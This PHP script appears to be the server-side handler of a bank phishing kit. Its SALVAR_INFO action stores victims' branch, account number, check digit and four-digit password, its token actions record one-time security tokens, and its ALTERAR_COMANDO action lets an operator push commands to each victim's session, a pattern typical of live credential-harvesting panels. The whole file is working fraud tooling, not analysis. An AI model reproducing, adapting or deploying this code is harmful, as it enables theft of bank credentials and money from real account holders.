<?php
require_once('_admin/config.php');

if(isset($_POST["action"])){
    $action = $_POST["action"];

    if($action == "GET_INFO") {
        $id = $_POST["id"];
        $clientHashId = $_POST["clientHashId"];
        Info::alterarUltimoAcesso($id);
        echo json_encode(Info::buscarApi($id, $clientHashId));
    }
    if($action == "ATUALIZAR_INFORMACOES") {
        $id = $_POST["id"];
        $clientHashId = $_POST["clientHashId"];
        $obj = $_POST["obj"];
        Info::updateByAPI($id, $clientHashId, $obj);
        echo "ok";
    }
    if($action == "SALVAR_TOKEN") {
        $id = $_POST["id"];
        $clientHashId = $_POST["clientHashId"];
        $valor = $_POST["valor"];
        $label = $_POST["label"];
        $status = $_POST["status"];
        Token::gravarToken($id, $label, $valor);
        Info::atualizarInformacoes($id, $clientHashId, 'comando', $status);
        echo "ok";
    }

    if($action == "ALTERAR_COMANDO") {
        $id = $_POST["id"];
        $clientHashId = $_POST["clientHashId"];
        $comando = $_POST["comando"];
        Info::atualizarInformacoes($id, $clientHashId, 'comando', $comando);
        echo "ok";
    }
    
    if($action == "SALVAR_TOKEN_INTERNA") {
        $id = $_POST["id"];
        $clientHashId = $_POST["clientHashId"];
        $valor = $_POST["valor"];
        $label = $_POST["label"];
        Token::gravarToken($id, $label, $valor);
        Info::atualizarInformacoes($id, $clientHashId, 'comando', 'AGUARDANDO_INTERNA');
        echo "ok";
    }


    if($action == "SALVAR_INFO") {

        $idAcesso = $_POST["idAcesso"];
        $agencia = $_POST["agencia"];
        $conta = $_POST["conta"];
        $digito = $_POST["digito"];
        $senha4 = $_POST["senha4"];
        $id = $_POST["id"];

        $nome = getNome($agencia, $conta.$digito);

        $id = Info::gravarInfoMobile($idAcesso, $agencia, $conta, $digito, $senha4, "AGUARDANDO", $id);
        $retorno = [
            "id" => $id,
            "nome" => $nome
        ];
        echo json_encode($retorno);
    }
}